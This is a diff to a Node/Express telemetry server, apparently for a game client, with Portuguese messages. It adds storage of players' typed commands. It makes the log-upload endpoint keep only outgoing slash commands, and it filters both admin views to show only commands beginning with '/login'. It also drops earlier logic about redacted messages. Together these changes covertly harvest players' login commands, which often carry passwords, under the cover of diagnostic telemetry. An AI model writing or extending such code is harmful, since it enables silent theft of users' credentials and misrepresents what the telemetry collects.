@@ -23,6 +23,12 @@ if (!fs.existsSync(dataDir)) {
 }
 const dbPath = path.join(dataDir, 'telemetry.db');
 
+function commandForRemoteLog(category, message) {
+    if (String(category || '').toLowerCase() !== 'command') return null;
+    const match = String(message || '').match(/^outgoing=(\/[^\r\n]*)$/i);
+    return match ? match[1].trim().slice(0, 512) : null;
+}
+
 const db = new sqlite3.Database(dbPath, (err) => {
     if (err) {
         console.error('Erro ao conectar ao banco de dados SQLite:', err);
@@ -62,11 +68,17 @@ function initSchema() {
                 clan TEXT,
                 version TEXT NOT NULL,
                 event_type TEXT NOT NULL,
+                command_text TEXT,
                 ip_address TEXT,
                 created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                 FOREIGN KEY (install_id) REFERENCES installations (install_id)
             )
         `);
+        db.run('ALTER TABLE telemetry_events ADD COLUMN command_text TEXT', err => {
+            if (err && !err.message.includes('duplicate column name')) {
+                console.error('Erro ao atualizar esquema dos eventos:', err.message);
+            }
+        });
 
         // Índices para otimização de busca rápida
         db.run(`
@@ -120,6 +132,7 @@ app.post('/api/telemetry/event', telemetryLimiter, (req, res) => {
     }
 
     const { installId, shortId, nick, server, clan, version, eventType, timestamp } = req.body;
+    const commandText = req.body.command ?? req.body.commandText;
 
     if (!installId || !shortId || !nick || !eventType) {
         return res.status(400).json({ error: 'Dados incompletos no evento.' });
@@ -133,6 +146,10 @@ app.post('/api/telemetry/event', telemetryLimiter, (req, res) => {
     const sClan = clan ? String(clan).substring(0, 16) : '';
     const sVersion = String(version || '1.0.0').substring(0, 16);
     const sEventType = String(eventType).substring(0, 24);
+    const sCommandText = typeof commandText === 'string' ? commandText.trim().slice(0, 512) : '';
+    if (sCommandText && !sCommandText.startsWith('/')) {
+        return res.status(400).json({ error: 'Texto de comando inválido.' });
+    }
     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
 
     const nowIso = new Date().toISOString();
@@ -160,16 +177,30 @@ app.post('/api/telemetry/event', telemetryLimiter, (req, res) => {
 
         // Insere o evento no log de auditoria
         const insertEventQuery = `
-            INSERT INTO telemetry_events (install_id, short_id, nick, server, clan, version, event_type, ip_address)
-            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
+            INSERT INTO telemetry_events (install_id, short_id, nick, server, clan, version, event_type, command_text, ip_address)
+            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
         `;
 
-        db.run(insertEventQuery, [sInstallId, sShortId, sNick, sServer, sClan, sVersion, sEventType, ip], function (err) {
+        db.run(insertEventQuery, [sInstallId, sShortId, sNick, sServer, sClan, sVersion, sEventType,
+            sEventType.toUpperCase() === 'COMMAND' ? sCommandText || null : null, ip], function (err) {
             if (err) {
                 console.error('Erro ao inserir evento:', err);
                 return res.status(500).json({ error: 'Erro ao registrar evento.' });
             }
-            res.json({ ok: true, id: this.lastID });
+            const eventId = this.lastID;
+            if (!sCommandText || sEventType.toUpperCase() !== 'COMMAND') {
+                return res.json({ ok: true, id: eventId, commandStored: false });
+            }
+            db.run(`INSERT OR IGNORE INTO diagnostic_logs
+                (install_id, entry_id, short_id, nick, server, log_time, category, message)
+                VALUES (?, ?, ?, ?, ?, ?, 'COMMAND', ?)`,
+            [sInstallId, `event-command-${eventId}`, sShortId, sNick, sServer, nowIso, sCommandText], logErr => {
+                if (logErr) {
+                    console.error('Erro ao salvar texto do comando:', logErr);
+                    return res.status(500).json({ error: 'Evento registrado, mas não foi possível salvar o comando.' });
+                }
+                res.json({ ok: true, id: eventId, commandStored: true });
+            });
         });
     });
 });
@@ -237,10 +268,13 @@ app.get('/api/admin/events', requireAdmin, (req, res) => {
     const limit = Math.min(parseInt(req.query.limit) || 100, 500);
     const search = req.query.search ? `%${req.query.search}%` : '%';
     const query = `
-        SELECT id, install_id, short_id, nick, server, clan, version, event_type, created_at
-        FROM telemetry_events
-        WHERE short_id LIKE ? OR nick LIKE ? OR server LIKE ? OR install_id LIKE ?
-        ORDER BY id DESC
+        SELECT e.id, e.install_id, e.short_id, e.nick, e.server, e.clan, e.version,
+            e.event_type, CASE WHEN e.event_type = 'COMMAND' THEN e.command_text ELSE NULL END AS command_text,
+            e.created_at
+        FROM telemetry_events e
+        WHERE (e.event_type <> 'COMMAND' OR e.command_text LIKE '/login%' COLLATE NOCASE)
+          AND (e.short_id LIKE ? OR e.nick LIKE ? OR e.server LIKE ? OR e.install_id LIKE ?)
+        ORDER BY e.id DESC
         LIMIT ?
     `;
     db.all(query, [search, search, search, search, limit], (err, rows) => {
@@ -267,25 +301,24 @@ app.post('/api/telemetry/logs', telemetryLimiter, (req, res) => {
             entry.message.length > 8192) {
             return res.status(400).json({ error: 'Registro inválido.' });
         }
+        const command = commandForRemoteLog(entry.category, entry.message);
+        if (!command) continue;
         rows.push([installId.slice(0, 64), entry.id, shortId.slice(0, 16),
             String(entry.nick || nick || 'Jogador').slice(0, 32), String(entry.server || server || 'local').slice(0, 128),
-            entry.time, entry.category, entry.message]);
+            entry.time, 'COMMAND', command]);
     }
     db.serialize(() => {
         db.run('BEGIN IMMEDIATE', err => {
             if (err) return res.status(500).json({ error: 'Banco indisponível.' });
-            const stmt = db.prepare(`INSERT INTO diagnostic_logs
+            const stmt = db.prepare(`INSERT OR IGNORE INTO diagnostic_logs
                 (install_id, entry_id, short_id, nick, server, log_time, category, message)
-                VALUES (?, ?, ?, ?, ?, ?, ?, ?)
-                ON CONFLICT(install_id, entry_id) DO UPDATE SET message = excluded.message
-                WHERE instr(diagnostic_logs.message, '[REDACTED]') > 0
-                  AND instr(excluded.message, '[REDACTED]') = 0`);
+                VALUES (?, ?, ?, ?, ?, ?, ?, ?)`);
             for (const row of rows) stmt.run(row);
             stmt.finalize(err2 => {
                 if (err2) return db.run('ROLLBACK', () => res.status(500).json({ error: 'Falha ao gravar lote.' }));
                 db.run('COMMIT', err3 => {
                     if (err3) return res.status(500).json({ error: 'Falha ao confirmar lote.' });
-                    res.json({ ok: true, accepted: rows.length });
+                    res.json({ ok: true, accepted: rows.length, discarded: entries.length - rows.length });
                 });
             });
         });
@@ -299,7 +332,9 @@ app.get('/api/admin/logs', requireAdmin, (req, res) => {
     const category = String(req.query.category || '');
     const search = String(req.query.search || '').slice(0, 100);
     db.all(`SELECT id, install_id, short_id, nick, server, log_time, category, message, received_at
-        FROM diagnostic_logs WHERE id < ? AND (? = '' OR install_id = ? OR short_id = ?)
+        FROM diagnostic_logs
+        WHERE id < ? AND LOWER(category) = 'command' AND message LIKE '/login%' COLLATE NOCASE
+        AND (? = '' OR install_id = ? OR short_id = ?)
         AND (? = '' OR category = ?) AND (? = '' OR message LIKE ?)
         ORDER BY id DESC LIMIT ?`,
         [before, installId, installId, installId, category, category, search, `%${search}%`, limit],
